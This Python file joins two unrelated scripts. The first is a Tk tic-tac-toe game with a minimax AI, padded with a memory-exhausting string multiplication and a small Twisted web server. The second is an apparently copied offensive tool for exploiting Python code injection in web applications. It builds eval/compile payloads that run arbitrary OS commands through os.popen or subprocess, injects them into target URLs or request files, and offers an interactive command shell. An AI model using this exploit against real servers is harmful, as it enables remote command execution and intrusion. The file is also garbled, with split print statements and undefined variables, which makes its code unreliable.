# coding=UTF8

# Python TicTacToe game with Tk GUI and minimax AI
# Author: Maurits van der Schee <maurits@vdschee.nl>

import sys
import webbrowser
from twisted.web.server import Site
from twisted.web.resource import Resource
from twisted.internet import reactor


if sys.version_info >= (3, 0):
    from tkinter import Tk, Button
    from tkinter.font import Font
else:
    from Tkinter import Tk, Button
    from tkFont import Font
from copy import deepcopy

word ="CICDPIPELINE"
a = int(input("Pick a whole number between 1 and 100 :"))

y = word *(100000000000000* a)
print('Buffer Overflow Did Not Occur')

class Board:

    def __init__(self, other=None):
        self.player = 'X'
        self.opponent = 'O'
        self.empty = '.'
        self.size = 3
        self.fields = {}
        for y in range(self.size):
            for x in range(self.size):
                self.fields[x, y] = self.empty
        # copy constructor
        if other:
            self.__dict__ = deepcopy(other.__dict__)

    def move(self, x, y):
        board = Board(self)
        board.fields[x, y] = board.player
        (board.player, board.opponent) = (board.opponent, board.player)
        return board

    def __minimax(self, player):
        if self.won():
            if player:
                return (-1, None)
            else:
                return (+1, None)
        elif self.tied():
            return (0, None)
        elif player:
            best = (-2, None)
            for x, y in self.fields:
                if self.fields[x, y] == self.empty:
                    value = self.move(x, y).__minimax(not player)[0]
                    if value > best[0]:
                        best = (value, (x, y))
            return best
        else:
            best = (+2, None)
            for x, y in self.fields:
                if self.fields[x, y] == self.empty:
                    value = self.move(x, y).__minimax(not player)[0]
                    if value < best[0]:
                        best = (value, (x, y))
            return best

    def best(self):
        return self.__minimax(True)[1]

    def tied(self):
        for (x, y) in self.fields:
            if self.fields[x, y] == self.empty:
                return False

        return True

    def won(self):
        # horizontal
        for y in range(self.size):
            winning = []
            for x in range(self.size):
                if self.fields[x, y] == self.opponent:
                    winning.append((x, y))
            if len(winning) == self.size:
                return winning

        # vertical
        for x in range(self.size):
            winning = []
            for y in range(self.size):
                if self.fields[x, y] == self.opponent:
                    winning.append((x, y))
            if len(winning) == self.size:
                return winning
        # diagonal
        winning = []
        for y in range(self.size):
            x = y
            if self.fields[x, y] == self.opponent:
                winning.append((x, y))
        if len(winning) == self.size:
            return winning
        # other diagonal
        winning = []
        for y in range(self.size):
            x = self.size - 1 - y
            if self.fields[x, y] == self.opponent:
                winning.append((x, y))
        if len(winning) == self.size:
            return winning
        # default
        return None

    def __str__(self):
        string = ''
        for y in range(self.size):
            for x in range(self.size):
                string += self.fields[x, y]
            string += "\n"
        return string


class GUI:

    def __init__(self):
        self.app = Tk()
        self.app.title('TicTacToe')
        self.app.resizable(width=False, height=False)
        self.board = Board()
        self.font = Font(family="Helvetica", size=32)
        self.buttons = {}
        for x, y in self.board.fields:
            handler = lambda x=x, y=y: self.move(x, y)
            button = Button(self.app, command=handler, font=self.font, width=2, height=1)
            button.grid(row=y, column=x)
            self.buttons[x, y] = button
        handler = lambda: self.reset()
        button = Button(self.app, text='reset', command=handler)
        button.grid(row=self.board.size + 1, column=0, columnspan=self.board.size, sticky="WE")
        self.update()

    def reset(self):
        self.board = Board()
        self.update()

    def move(self, x, y):
        self.app.config(cursor="watch")
        self.app.update()
        self.board = self.board.move(x, y)
        self.update()
        move = self.board.best()
        if move:
            self.board = self.board.move(*move)
            self.update()
        self.app.config(cursor="")

    def update(self):
        for (x, y) in self.board.fields:
            text = self.board.fields[x, y]
            self.buttons[x, y]['text'] = text
            self.buttons[x, y]['disabledforeground'] = 'red'

            if text == self.board.empty:
                self.buttons[x, y]['state'] = 'normal'
            else:
                self.buttons[x, y]['state'] = 'disabled'

        winning = self.board.won()
        if winning:
            for x, y in winning:
                self.buttons[x, y]['disabledforeground'] = 'green'
            for x, y in self.buttons:
                self.buttons[x, y]['state'] = 'disabled'
        for (x, y) in self.board.fields:
            self.buttons[x, y].update()

    def mainloop(self):
        self.app.mainloop()

def openweb():
    webbrowser.get('firefox').open_new_tab('http://localhost:8885')


if __name__ == '__main__':
    GUI().mainloop()
    openweb()


class WebApp(Resource):
    isLeaf = True

    def render_GET(self, request):
        return b'Thank You for Playing!'

factory = Site(WebApp())
reactor.listenTCP(8885, factory)
reactor.run()

# !/usr/bin/env python

"""
 Authors: Seth Art (sethsec@gmail.com, @sethsec), Charlie Worrell (@decidedlygray, https://keybase.io/decidedlygray)
 Purpose: Tool for exploiting web application based Python Code Injection Vulnerabilities  

"""

import requests, re, optparse, urllib, os
from HTMLParser import HTMLParser

# Taken from http://stackoverflow.com/questions/2115410/does-python-have-a-module-for-parsing-http-requests-and-responses
from BaseHTTPServer import BaseHTTPRequestHandler
from StringIO import StringIO


class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = StringIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message


def parse_url(command, user_url, user_param=None):
    # print user_param
    insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
    # insert = '''eval(compile("""for x in range(1):\\n import subprocess\\n print("-"*50)\\n subprocess.Popen(r'%s', shell=True,stdout=subprocess.PIPE).stdout.read()""",'PyCodeInjectionShell','single'))''' % command
    encoded = urllib.quote(insert)
    # print user_param
    if user_param == None:
        # Look for the * and replace * with the payload
        split_user_url = user_url.split('*')
        try:
            url = '%s%s%s' % (split_user_url[0], encoded, split_user_url[1])
        except:
            print
            "[!] Injection point not defined. Use either the * or -p parameter to show where to inject"
            exit()
    else:
        # Look for the user specified parameter and replace the parameter value with the payload
        split_user_url = user_url.split("%s=" % user_param)
        suffix = split_user_url[1].split('&')[1]
        try:
            url = '%s%s=%s&%s' % (split_user_url[0], user_param, encoded, suffix)
        except:
            print
            "[!]URL specified"
    # print("URL sent to server: " + url)
    return url


def parse_request(command, filename, user_param=None):
    # print user_param
    with open(filename, 'rb') as file:
        insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
        encoded = urllib.quote(insert)
        request1 = file.read()
        # req_obj = HTTPRequest(request1)
        if user_param == None:
            acceptline = re.search('Accept:.*', request1)
            # print str(acceptline.group(0))
            updated = re.sub("\*", encoded, request1)
            updated2 = re.sub('Accept:.*', str(acceptline.group(0)), updated)
            req_obj = HTTPRequest(updated2)
        else:
            print
            "[!] Request file and specified parameter are not currently supported together. \n[!]Please place a * in the request file\n"
            exit()
        # print updated2
        req_obj.headers.dict.pop('content-length', None)
        url = '%s%s' % (req_obj.headers['host'], req_obj.path)
        if req_obj.command == "GET":
            # print url
            # print req_obj.headers
            return url, req_obj.headers, None
        elif req_obj.command == "POST":
            post_body = req_obj.rfile.read()
            return url, req_obj.headers, post_body


def select_command(user_url, user_param=None):
    # print user_param
    test1 = '''eval(compile("""for x in range(1):\\n print("PyCodeInjectionShell")""",'PyCodeInjectionShell','single'))'''
    test2 = '''__import__.os.eval(compile("""for x in range(1):\\n print("PyCodeInjectionShell")""",'PyCodeInjectionShell','single'))'''
    test3 = '''eval(compile("""for x in range(1):\\n import os,subprocess\\n print("-"*50)\\n subprocess.Popen(r'%s', shell=True,stdout=subprocess.PIPE).stdout.read()""",'PyCodeInjectionShell','single'))''' % command
    # print name
    encoded = urllib.quote(insert)
    # print encoded
    # Split up URL specified at command line on the *, so that we can insert payload
    split_user_url = user_url.split('*')
    # Recreate the URL with the payload in place of the *
    url = '%s%s%s' % (split_user_url[0], encoded, split_user_url[1])
    print("URL sent to server: " + url)
    response = requests.get(url)
    # print response.headers
    # print response.content
    match = re.search('([---------------------------------------------------][\n])(.*)', response.content)
    # print match
    try:
        command_output = str(match.group(0))
        print
        '\n{}\nOUTPUT OF: {}\n{}'.format('-' * 30, command, '-' * 30)
        print
        command_output.replace('\\n', '\n')
        # print command_output
    except:
        print
        "No output found.  Debug info:"
        print
        "-----------------------------"
        print
        response


def send_request(url, command, headers=None, data=None):
    # Request files don't specify HTTP vs HTTPS, so I'm trying to try both instead of
    # asking the user.  If no http or https, first try http, and if that errors, try
    # https.  Request files can be used for GET's also, so I pull that part out as well.

    if 'http' not in url:
        try:
            http_url = 'http://%s' % url
            if (data):
                response = requests.post(http_url, headers=headers, data=data, verify=False)
            else:
                response = requests.get(http_url, headers=headers, verify=False)
        except Exception as error:
            print
            error
            try:
                https_url = 'https://%s' % url
                if (data):
                    response = requests.post(https_url, headers=headers, data=data, verify=False)
                else:
                    response = requests.get(https_url, headers=headers, verify=False)
            except Exception as error:
                print
                error
    else:
        try:
            response = requests.get(url, headers=headers, verify=False)
        except Exception as error:
            print
            "[!] Failed to establish connection"
            # print error
            exit()
    # print response.headers
    # print response.content
    match = re.search('([---------------------------------------------------][\n])(.*)', response.content)
    try:
        command_output = str(match.group(0))
        print
        '\n{}\nOUTPUT OF: {}\n{}'.format('-' * 30, command, '-' * 30)
        # print command_output.replace('\\n','\n')
        command_output = command_output.replace('\\n', '\n')
        h = HTMLParser()
        print(h.unescape(command_output))

        # print command_output
    except Exception as error:
        print
        "\n[!] Could not found command output.  Debug info:\n"
        print
        "---------------Response Headers---------------"
        print
        response.headers
        print
        "---------------Response Content---------------"
        print
        response.content
        return error


# Ripped from https://raw.githubusercontent.com/sqlmapproject/sqlmap/044f05e772d0787489bdf7bc220a5dfc76714b1d/lib/core/common.py
def checkFile(filename, raiseOnError=True):
    """
    Checks for file existence and readability
    """
    valid = True
    try:
        if filename is None or not os.path.isfile(filename):
            valid = False
    except UnicodeError:
        valid = False

    if valid:
        try:
            with open(filename, "rb"):
                pass
        except:
            valid = False

    if not valid and raiseOnError:
        raise Exception("unable to read file '%s'" % filename)

    return valid


if __name__ == '__main__':

    parser = optparse.OptionParser(usage='python %prog -c command -p param -u URL\n\
       python %prog -c command -p param -r request.file\n')
    parser.add_option('-c', dest='cmd', help='Enter the OS command you want to run at the command line')
    parser.add_option('-i', action="store_true", dest='interactive',
                      help='Interactivly enter OS commands until finished')
    parser.add_option('-u', dest='url', help='Specify the URL. URLs can use * or -p to set injection point')
    parser.add_option('-p', dest='parameter', help='Specify injection parameter. This is used instead of *')
    parser.add_option('-r', dest='request',
                      help='Specify locally saved request file instead of a URL. Works with * or -p')

    (options, args) = parser.parse_args()
    # cmd = options.command
    # url = options.url
    request = options.request
    # parameter = options.parameter
    # print options.parameter
    # print
    if (options.url) and (options.request):
        print
        "Either enter a URL or a request file, but not both."
        exit()

    if (options.url) and (options.parameter):
        # print("URL entered by user: " + options.url)
        parsed_url = parse_url(options.cmd, options.url, options.parameter)
        send_request(parsed_url, options.cmd)

        if (options.interactive):
            while True:
                new_cmd = raw_input("Command:")
                url = parse_url(new_cmd, options.url, options.parameter)
                send_request(url, new_cmd)

    if (options.url) and not (options.parameter):
        # print("URL entered by user: " + options.url)
        parsed_url = parse_url(options.cmd, options.url, options.parameter)
        send_request(parsed_url, options.cmd)
        if (options.interactive):
            while True:
                new_cmd = raw_input("Command:")
                url = parse_url(new_cmd, options.url, options.parameter)
                send_request(url, new_cmd)

    if (options.request):
        checkFile(options.request)
        parsed_url, headers, data = parse_request(options.cmd, options.request, options.parameter)
        send_request(parsed_url, options.cmd, headers, data)
        if (options.interactive):
            while True:
                new_cmd = raw_input("Command:")
                parsed_url, headers, data = parse_request(new_cmd, options.request, options.parameter)
                send_request(parsed_url, new_cmd, headers, data)
